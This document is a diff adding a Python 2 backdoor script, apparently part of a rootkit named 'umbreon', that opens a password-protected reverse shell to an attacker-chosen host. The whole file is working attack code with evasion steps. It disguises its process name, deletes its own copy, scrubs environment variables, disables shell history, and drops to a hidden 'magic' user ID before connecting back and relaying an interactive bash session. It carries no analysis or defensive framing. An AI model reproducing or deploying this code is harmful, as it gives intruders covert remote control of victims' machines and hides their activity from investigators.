@@ -1,0 +1,57 @@
+#!/usr/bin/env python2
+import socket, os, commands, pty, sys, select, shutil, crypt, getpass, umbreon
+if sys.argv[0] != " ": shutil.copy(sys.argv[0]," ") # this is megadongs. srsly.
+new_argv = ['espeon-shell',]
+for x in xrange(1,100): new_argv.append(" ")
+if os.getenv('kk') != 'kk':
+    os.putenv('kk','kk')
+    os.putenv('bchost',sys.argv[1])
+    os.putenv('bcport',sys.argv[2])
+    try: os.putenv('bcproto',sys.argv[3])
+    except: os.putenv('bcproto','tcp')
+    os.execv(sys.executable, new_argv)
+esc = '%s['%chr(27)
+color = esc + "1;36m"
+reset = esc + "0m"
+protocols={"tcp":socket.SOCK_STREAM,"udp":socket.SOCK_DGRAM}
+def espeon_shell(host,port,proto):
+        sock = socket.socket(socket.AF_INET, protocols[proto])
+        try: sock.connect( (host, int(port)) )
+        except: pass
+        else:
+            os.chdir(umbreon.home)
+            pid, childProcess = pty.fork()
+            if pid == 0:
+                os.putenv("HISTFILE","/dev/null")
+                os.putenv("HOME",umbreon.home)
+                os.putenv("PATH",'/usr/local/sbin:/usr/sbin:/sbin:'+os.getenv('PATH'))
+                os.putenv("TERM",'screen')
+                if crypt.crypt(getpass.getpass("Password: "), umbreon.cryptpass) == umbreon.cryptpass:
+                    os.execv("/bin/bash",("-bash","-i"))
+                else: os.execv("/bin/echo", ("echo","fuck u dad"))
+                sock.shutdown(1)
+            else:
+                b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
+                c = os.fdopen(childProcess,'r+')
+                y = {b:c,c:b}
+                try:
+                    while True:
+                        for n in select.select([b,c],[],[])[0]:
+                            z = os.read(n.fileno(),4096)
+                            y[n].write(z)
+                            y[n].flush()
+                except: exit()
+bchost = os.getenv('bchost')
+bcport = os.getenv('bcport')
+bcproto = os.getenv('bcproto')
+os.unsetenv('bchost')
+os.unsetenv('bcport')
+os.unsetenv('bcproto')
+os.unsetenv('kk')
+os.unlink(" ")
+pid=0
+os.setgid(umbreon.magic_uid)
+os.setuid(umbreon.magic_uid)
+pid=os.fork()
+if not pid: espeon_shell(bchost,bcport,bcproto)
+else: exit()
